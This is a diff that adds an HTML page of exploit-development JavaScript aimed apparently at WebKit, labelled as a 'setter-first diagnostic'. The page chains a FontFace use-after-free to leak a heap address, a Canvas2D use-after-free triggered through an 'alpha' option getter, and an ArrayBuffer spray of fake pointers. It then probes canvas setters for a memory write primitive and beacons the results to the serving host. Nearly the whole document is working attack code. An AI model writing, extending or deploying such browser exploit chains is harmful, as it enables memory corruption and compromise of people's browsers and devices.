@@ -1,0 +1,298 @@
+<!--
+  p650: Canvas2D forge — SETTER-FIRST diagnostic
+
+  p649j proved: createLinearGradient (a factory method) crashes because
+  the WebKit binding infrastructure accesses m_canvas (via scriptExecutionContext())
+  BEFORE the method body runs.
+
+  HYPOTHESIS: Property SETTERS may NOT access scriptExecutionContext().
+  A setter like `ctx.lineWidth = 5` only needs to:
+    1. Cast thisValue to JSCanvasRenderingContext2D (JS-only)
+    2. Get the C++ impl reference (pointer read from JS wrapper)
+    3. Call impl.setLineWidth(5) → state().lineWidth = 5
+
+  No return value wrapping → no globalObject needed → maybe no scriptExecutionContext().
+
+  If the setter SURVIVES, we have a WRITE PRIMITIVE into the state stack
+  (which is at address T from FontFace UAF).
+
+  Test order:
+    S1: lineWidth = 42.5 (float setter)
+    S2: globalAlpha = 0.5 (float setter)
+    S3: shadowOffsetX = 99 (float setter)
+    S4: setTransform(2,0,0,2,0,0) (method — 6 doubles, needs return wrapping?)
+    S5: fillStyle = '#ff0000' (string setter — different path)
+
+  If S1 crashes → setter binding ALSO accesses m_canvas. Game over for cross-type.
+  If S1 survives but S4 crashes → setTransform wraps return, but simple setters are safe.
+
+  Pattern A uniform: {T_lo, T_hi, 1, 1} × 48 across all 768 bytes
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p650</title></head>
+<body>p650: setter-first
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P650-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+var f64 = new Float64Array(1);
+var u8f = new Uint8Array(f64.buffer);
+function d2hex(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8f[i].toString(16)).slice(-2);
+  return h;
+}
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+flush();
+
+// ================================================================
+// PHASE 1: FontFace UAF → leak T
+// ================================================================
+var ffA = new FontFace('ff0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+retained.push(ffA);
+
+var ffStyle = document.createElement('style');
+ffStyle.textContent = "@font-face { font-family: ffs0; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(ffStyle);
+
+var ffFired = false;
+var ffBufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffFired) return undefined;
+    ffFired = true;
+    ffStyle.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      ffBufs.push(new Uint8Array(ab));
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em ff0, ffs0', 'AB');
+
+setTimeout(function() {
+try {
+  var T_lo = 0, T_hi = 0;
+  var ffHit = -1;
+
+  for (var i = 0; i < ffBufs.length; i++) {
+    var v = ffBufs[i];
+    var nonzero = 0;
+    for (var j = 0; j < 192; j++) if (v[j] !== 0) nonzero++;
+    if (nonzero > 0) {
+      ffHit = i;
+      var dv = new DataView(v.buffer);
+      T_lo = dv.getUint32(0x58, true);
+      T_hi = dv.getUint32(0x5C, true);
+      emit('FF-HIT', 'buf[' + i + '] T=0x' + hex32(T_hi) + hex32(T_lo));
+      break;
+    }
+  }
+  if (ffHit < 0) {
+    emit('FF-MISS', 'ABORT');
+    flush();
+    return;
+  }
+  flush();
+
+  // ================================================================
+  // PHASE 2: Canvas2D UAF
+  // ================================================================
+  var uafCanvas = document.createElement('canvas');
+  uafCanvas.width = 1; uafCanvas.height = 1;
+
+  var innerCtx = null;
+  var gFired = false;
+  var cvOpts = {};
+  Object.defineProperty(cvOpts, 'alpha', {
+    get: function() {
+      gFired = true;
+      innerCtx = uafCanvas.getContext('2d');
+      return true;
+    }
+  });
+
+  try { uafCanvas.getContext('bitmaprenderer', cvOpts); } catch(e) {}
+
+  emit('CV-UAF', 'ok=' + gFired + ' inner=' + !!innerCtx);
+  flush();
+  if (!innerCtx) { emit('ABORT', 'no ctx'); flush(); return; }
+
+  // ================================================================
+  // PHASE 3: AB(768) spray — Pattern A uniform
+  // ================================================================
+  var AB_N = 300;
+  var abViews = [];
+
+  var tmpl = new ArrayBuffer(768);
+  var tmplDV = new DataView(tmpl);
+  var tmplU8 = new Uint8Array(tmpl);
+
+  for (var off = 0; off < 768; off += 16) {
+    tmplDV.setUint32(off + 0, T_lo, true);
+    tmplDV.setUint32(off + 4, T_hi, true);
+    tmplDV.setUint32(off + 8, 1, true);
+    tmplDV.setUint32(off + 12, 1, true);
+  }
+
+  for (var i = 0; i < AB_N; i++) {
+    var ab = new ArrayBuffer(768);
+    new Uint8Array(ab).set(tmplU8);
+    abViews.push(new Uint8Array(ab));
+    retained.push(ab);
+  }
+
+  emit('SPRAY', AB_N + ' patA T=0x' + hex32(T_hi) + hex32(T_lo));
+  flush();
+
+  // ================================================================
+  // PHASE 4: SETTER-FIRST diagnostic
+  // Each setter has PRE/OK beacons. If PRE arrives but OK doesn't,
+  // that setter crashed WebProcess.
+  // ================================================================
+
+  // S1: lineWidth setter (float)
+  emit('S1-PRE', 'lineWidth=42.5');
+  flush();
+  try {
+    innerCtx.lineWidth = 42.5;
+    emit('S1-OK', 'survived');
+  } catch(e) {
+    emit('S1-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // S2: globalAlpha setter (float, clamped 0-1)
+  emit('S2-PRE', 'globalAlpha=0.5');
+  flush();
+  try {
+    innerCtx.globalAlpha = 0.5;
+    emit('S2-OK', 'survived');
+  } catch(e) {
+    emit('S2-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // S3: shadowOffsetX setter (float)
+  emit('S3-PRE', 'shadowOffsetX=99');
+  flush();
+  try {
+    innerCtx.shadowOffsetX = 99;
+    emit('S3-OK', 'survived');
+  } catch(e) {
+    emit('S3-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // S4: setTransform method (returns void — no wrapping needed?)
+  emit('S4-PRE', 'setTransform');
+  flush();
+  try {
+    innerCtx.setTransform(2, 0, 0, 2, 100, 200);
+    emit('S4-OK', 'survived');
+  } catch(e) {
+    emit('S4-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // S5: fillStyle setter (string)
+  emit('S5-PRE', 'fillStyle=red');
+  flush();
+  try {
+    innerCtx.fillStyle = '#ff0000';
+    emit('S5-OK', 'survived');
+  } catch(e) {
+    emit('S5-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // S6: save() — pushes state, no return value
+  emit('S6-PRE', 'save()');
+  flush();
+  try {
+    innerCtx.save();
+    emit('S6-OK', 'survived');
+  } catch(e) {
+    emit('S6-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // S7: restore() — pops state, no return value
+  emit('S7-PRE', 'restore()');
+  flush();
+  try {
+    innerCtx.restore();
+    emit('S7-OK', 'survived');
+  } catch(e) {
+    emit('S7-EXC', String(e).slice(0,60));
+  }
+  flush();
+
+  // If setters survived, check if AB was modified (write landed somewhere!)
+  var modAB = -1;
+  var modOff = -1;
+  for (var ai = 0; ai < abViews.length; ai++) {
+    var v = abViews[ai];
+    for (var off = 0; off < 768; off++) {
+      if (v[off] !== tmplU8[off]) {
+        modAB = ai;
+        modOff = off;
+        break;
+      }
+    }
+    if (modAB >= 0) break;
+  }
+  if (modAB >= 0) {
+    emit('MOD', 'AB[' + modAB + '] off=' + modOff);
+    // Dump first 32 modified bytes
+    var v = abViews[modAB];
+    var diffBytes = [];
+    var count = 0;
+    for (var off = 0; off < 768 && count < 48; off++) {
+      if (v[off] !== tmplU8[off]) {
+        diffBytes.push(off + ':' + hex32(v[off]).slice(6));
+        count++;
+      }
+    }
+    emit('DIFF', diffBytes.join(' '));
+  } else {
+    emit('MOD', 'none');
+  }
+
+  emit('DONE', 'all-setters-passed');
+  flush();
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 0);
+})();
+</script>
+</body></html>
